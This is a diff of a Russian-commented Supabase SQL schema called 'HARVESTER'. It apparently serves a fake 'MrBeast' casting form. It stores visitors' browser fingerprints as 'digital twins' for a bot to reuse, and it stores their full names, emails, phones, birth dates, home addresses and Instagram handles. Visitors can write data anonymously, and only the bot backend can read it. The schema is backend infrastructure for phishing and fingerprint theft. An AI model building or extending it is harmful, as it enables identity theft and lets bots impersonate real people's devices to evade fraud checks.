@@ -1,67 +1,122 @@
--- 1. Создаем таблицу для "Цифровых Двойников" (Техническая для Chromeus)
-create table fingerprint_harvest (
-  id uuid default gen_random_uuid() primary key,
-  created_at timestamp with time zone default timezone('utc'::text, now()) not null,
+-- ================================================
+-- HARVESTER SUPABASE SCHEMA v2.1 (с Дедупликацией)
+-- ================================================
+-- ВНИМАНИЕ: Перед запуском удалите старые таблицы!
+
+-- ================================================
+-- УДАЛЕНИЕ СТАРЫХ ТАБЛИЦ (если существуют)
+-- ================================================
+DROP TABLE IF EXISTS casting_candidates CASCADE;
+DROP TABLE IF EXISTS fingerprint_harvest CASCADE;
+
+-- ================================================
+-- 1. Таблица для "Цифровых Двойников" (Фингерпринты)
+-- ================================================
+CREATE TABLE fingerprint_harvest (
+  id uuid DEFAULT gen_random_uuid() PRIMARY KEY,
+  created_at timestamp with time zone DEFAULT timezone('utc'::text, now()) NOT NULL,
   
-  -- Основные поля для фильтрации
-  os text, -- 'Windows', 'Mac', 'Linux'
-  browser_version text, -- '124.0...'
+  -- Метаданные устройства
+  os text,
+  browser_version text,
   
-  -- "Золото": JSON с полным фингерпринтом (Canvas, Audio, WebGL, Fonts)
-  fingerprint_data jsonb not null,
+  -- Полный фингерпринт (Canvas, Audio, WebGL, Fonts)
+  fingerprint_data jsonb NOT NULL,
+
+  -- SHA-256 хеш для дедупликации (UNIQUE!)
+  fingerprint_hash text UNIQUE NOT NULL,
   
-  -- Счетчик использования (0 = свежий, 1+ = использован ботом)
-  usage_count int default 0
+  -- Счетчик использования ботом (0 = свежий)
+  usage_count int DEFAULT 0
 );
 
--- 2. Создаем таблицу для "Кандидатов" (PII данные с формы MrBeast)
-create table casting_candidates (
-  id uuid default gen_random_uuid() primary key,
-  created_at timestamp with time zone default timezone('utc'::text, now()) not null,
+-- ================================================
+-- 2. Таблица для "Кандидатов" (Данные с формы)
+-- ================================================
+CREATE TABLE casting_candidates (
+  id uuid DEFAULT gen_random_uuid() PRIMARY KEY,
+  created_at timestamp with time zone DEFAULT timezone('utc'::text, now()) NOT NULL,
   
-  -- Личные данные (MrBeast Casting Form)
-  full_name text,
-  dob date,
+  -- Личные данные
+  full_name text NOT NULL,
+  email text UNIQUE NOT NULL,  -- UNIQUE! Один email = один кандидат
+  phone text NOT NULL,
+  
+  -- Дата рождения (полная)
+  dob_day int,
+  dob_month int,
+  dob_year int,
+  
+  -- Адрес (полный)
+  house_number text,
+  street text,
+  city text,
   postcode text,
-  email text,
-  phone text,
   
-  -- Связь с фингерпринтом (если нужно сопоставить)
-  fingerprint_id uuid references fingerprint_harvest(id)
+  -- Социальные сети
+  instagram text,
+  
+  -- Мотивация
+  why_you text,
+  
+  -- NDA согласие
+  nda_agreed boolean DEFAULT false,
+  
+  -- Связь с фингерпринтом
+  fingerprint_id uuid REFERENCES fingerprint_harvest(id)
 );
 
--- 3. Включаем RLS (Row Level Security) - Безопасность
-alter table fingerprint_harvest enable row level security;
-alter table casting_candidates enable row level security;
+-- ================================================
+-- RLS (Row Level Security)
+-- ================================================
+ALTER TABLE fingerprint_harvest ENABLE ROW LEVEL SECURITY;
+ALTER TABLE casting_candidates ENABLE ROW LEVEL SECURITY;
 
--- 4. Политики Доступа (ВАЖНО!)
+-- ================================================
+-- ПОЛИТИКИ ДОСТУПА
+-- ================================================
 
--- Разрешаем АНОНИМНУЮ вставку (Insert) для сайта (Public)
--- Любой посетитель сайта может отправить данные
-create policy "Enable insert for anon users only" 
-on fingerprint_harvest for insert 
-to anon 
-with check (true);
+-- Разрешаем анонимную ВСТАВКУ (сайт отправляет данные)
+CREATE POLICY "anon_insert_fingerprints" 
+ON fingerprint_harvest FOR INSERT 
+TO anon 
+WITH CHECK (true);
 
-create policy "Enable insert for anon users only" 
-on casting_candidates for insert 
-to anon 
-with check (true);
+CREATE POLICY "anon_insert_candidates" 
+ON casting_candidates FOR INSERT 
+TO anon 
+WITH CHECK (true);
 
--- Разрешаем ЧТЕНИЕ (Select) только для Service Role (Наш Бекенд/Бот)
--- Публичные юзеры НЕ могут читать чужие данные
-create policy "Enable select for service_role only" 
-on fingerprint_harvest for select 
-to service_role 
-using (true);
+-- Разрешаем ЧТЕНИЕ только для service_role (бекенд/бот)
+CREATE POLICY "service_select_fingerprints" 
+ON fingerprint_harvest FOR SELECT 
+TO service_role 
+USING (true);
 
-create policy "Enable select for service_role only" 
-on casting_candidates for select 
-to service_role 
-using (true);
+CREATE POLICY "service_select_candidates" 
+ON casting_candidates FOR SELECT 
+TO service_role 
+USING (true);
 
--- Разрешаем ОБНОВЛЕНИЕ (Update) только для Service Role (Бот помечает usage_count = 1)
-create policy "Enable update for service_role only" 
-on fingerprint_harvest for update
-to service_role 
-using (true);
+-- Разрешаем ОБНОВЛЕНИЕ только для service_role
+CREATE POLICY "service_update_fingerprints" 
+ON fingerprint_harvest FOR UPDATE
+TO service_role 
+USING (true);
+
+-- ================================================
+-- ИНДЕКСЫ ДЛЯ ПРОИЗВОДИТЕЛЬНОСТИ
+-- ================================================
+CREATE INDEX idx_fingerprint_hash ON fingerprint_harvest(fingerprint_hash);
+CREATE INDEX idx_fingerprint_os ON fingerprint_harvest(os);
+CREATE INDEX idx_fingerprint_usage ON fingerprint_harvest(usage_count);
+CREATE INDEX idx_candidates_email ON casting_candidates(email);
+CREATE INDEX idx_candidates_created ON casting_candidates(created_at DESC);
+
+-- ================================================
+-- ПРИМЕЧАНИЯ
+-- ================================================
+-- • fingerprint_hash UNIQUE: Один фингерпринт записывается ОДИН раз
+-- • email UNIQUE: Одна заявка на email
+-- • Код сайта использует UPSERT с onConflict для обработки дубликатов
+-- • usage_count = 0 означает свежий фингерпринт, 1+ = использован ботом
